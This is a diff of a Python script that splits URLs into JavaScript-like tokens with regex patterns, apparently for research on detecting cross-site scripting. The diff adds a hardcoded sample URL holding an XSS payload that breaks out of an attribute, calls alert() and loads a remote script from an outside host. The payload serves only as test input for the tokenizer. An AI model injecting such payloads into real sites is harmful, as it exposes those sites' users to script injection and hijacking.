@@ -1,27 +1,28 @@
 from dataclasses import dataclass
-from xssed_url_clean import DeepURL
-from urllib.parse import ParseResult, urlparse
+from urllib.parse import urlparse
 from typing import Any, List, Tuple
 import re
 from random import choice
-from pickle import dump, load
+from pickle import dump
 
 
 
 tokens = {
-    'start_label': re.compile('<[^>/\s]+>?'),
+    'start_label': re.compile('<[^>]+>'),
     'end_label': re.compile('</[^>^/]+>'),
     'events': re.compile('on[a-zA-Z]+='),
-    'function_name': re.compile('(?:[a-zA-Z$_][a-zA-Z$_0-9]+\.)*[a-zA-Z$_][a-zA-Z$_0-9]+\('),
-    'variable': re.compile('(?:[a-zA-Z$_][a-zA-Z$_0-9]+\.)*[a-zA-Z$_][a-zA-Z$_0-9]+\(?'),
-    'string_arg' : re.compile('\(\w*\"(?:(\\(\\|n|r|\')|[^\\\n\r\'])*\"\w*\)'),
-    'num_arg' : re.compile('\([1-9][0-9]*.?[0-9]*\)'),
+    'function_name': re.compile('(?:[a-zA-Z$_][a-zA-Z$_0-9]*\.)*[a-zA-Z$_][a-zA-Z$_0-9]*\('),
+    'identifier': re.compile('(?:[a-zA-Z$_][a-zA-Z$_0-9]*\.)*[a-zA-Z$_][a-zA-Z$_0-9]*'),
+    'string_arg' : re.compile('\s*(\"(?:(\\(\\|n|r|\')|[^\\\n\r\"])*\"|\'(?:(\\(\\|n|r|\")|[^\\\n\r\'])*\')\s*\)'),
+    'num_arg' : re.compile('[1-9][0-9]*\.?[0-9]*\)'),
+    'assign_constant': re.compile('=(0|[1-9][0-9]*\.?[0-9]*)|=(\"(?:(\\(\\|n|r|\')|[^\\\n\r\"])*\"|\'(?:(\\(\\|n|r|\")|[^\\\n\r\'])*\')'),
     'script_url': re.compile('[a-zA-Z]*script:'),
-    'other': re.compile('\{\[|\]|\.|\.\.\.|\;|\,|<|>|<=|>=|==|!=|===|!==|\+|-|\*|%|\*\*|\+\+|--|<<|>>|>>>|&|\||\^|!|~|&&|\|\||\?\?|\?|:|=|\+=|-=|\*=|%=|\*\*=|<<=|>>=|>>>=|&=|\|=|\^=|&&=|\|\|=|\?\?=|=>')
+    'other': re.compile('\{\[|\]|\.|\.\.\.|\;|\,|<|>|<=|>=|==|!=|===|!==|\+|-|\*|%|\*\*|\+\+|--|<<|>>|>>>|&|\||\^|!|~|&&|\|\||\?\?|\?|:|=|\+=|-=|\*=|%=|\*\*=|<<=|>>=|>>>=|&=|\|=|\^=|&&=|\|\|=|\?\?=|=>|/')
 }
 
 @dataclass
 class JSToken:
+    type: str
     value: str
     start: int
     end: int
@@ -29,7 +30,7 @@ class JSToken:
 @dataclass
 class URLTokens:
     parsed_url: str
-    token_list: List[Tuple[str, JSToken]]
+    token_list: List[JSToken]
 
 
 
@@ -39,56 +40,55 @@ def trim_url(url: str):
 
 def ordered_interval_overlaps(first: Tuple[int, int], second: Tuple[int, int] ) -> bool:
     a, b = first
-    c, d = second
+    c, _ = second
 
-    return c >= a and d <= b
+    # if the start of the second is inside the first
+    return c >= a and c < b
 
-def prune_tokens(sorted_tokens: List[Tuple[str, JSToken]]) -> List[Tuple[str, JSToken]]:
-    sorted_tokens.sort(key = lambda x: (x[1].start, -x[1].end))
+def prune_tokens(sorted_tokens: List[JSToken]) -> List[JSToken]:
+    sorted_tokens.sort(key = lambda x: (x.start, -x.end))
     curr = sorted_tokens[0]
     pruned_tokens = list([curr])
 
     for token in sorted_tokens[1:]:
-        if ordered_interval_overlaps( (curr[1].start, curr[1].end), (token[1].start, token[1].end) ):
+        if ordered_interval_overlaps( (curr.start, curr.end), (token.start, token.end) ):
             pass
         else:
             pruned_tokens.append(token)
             curr = token
     return pruned_tokens 
 
-def tokenize(url: str) -> List[Tuple[str, JSToken]]:
+def tokenize(url: str) -> List[JSToken]:
 
     url = trim_url(url)       
     token_list = list()
     for token_type in tokens:
         for matched in tokens[token_type].finditer(url):
-            token_list.append( ( token_type, JSToken(matched.group(0), matched.start(), matched.end()) ) )
+            token_list.append( ( JSToken(token_type, matched.group(0), matched.start(), matched.end()) ) )
 
     sorted_tokens = prune_tokens(token_list)
     return sorted_tokens
 
 
+def print_token_list(url_tok: URLTokens):
+    print(url_tok.parsed_url)
+    for token in url_tok.token_list:
+        print(token)
+    print('')
+
 if __name__ == "__main__":
 
-    with open('dmoz_dir.txt', 'r') as infile, \
-            open('dmoz_tokens.txt', 'ab') as outfile:
-        lines = infile.read().splitlines()
-        for i in range(10):
-            url = choice(lines)
-            tmp = URLTokens(url, tokenize(url))
-            dump(tmp, outfile)
+    # with open('dec_xss_urls.txt', 'r') as infile:
+    #     lines = infile.read().splitlines()
+    #     for i in range(10):
+    #         url = choice(lines)
+    #         tmp = URLTokens(url, tokenize(url))
+    #         print_token_list(tmp)
+            # dump(tmp, outfile)
 
-    print('\n\nPickle Load:\n')
-    with open('dmoz_tokens.txt', "rb") as f:
-        while True:
-            try:
-                tmp = load(f)
-                for a,b in tmp.token_list:
-                    print(f'{a} : {b}')
-                print('')
-            except EOFError:
-                break
-
+    url = 'http://website/remind.php?l=fr&error=2&email=/"><script>alert(\'Xss ByAtm0n3r\')</script><script type="text/javascript"src="http://yourjavascript.com/27544112151/xss.atmon3r.js"></script>'
+    tmp = URLTokens(url, tokenize(url))
+    print_token_list(tmp)
         # for line in lines:
         #     tmp = JSTokenizer(DeepURL(line))
 
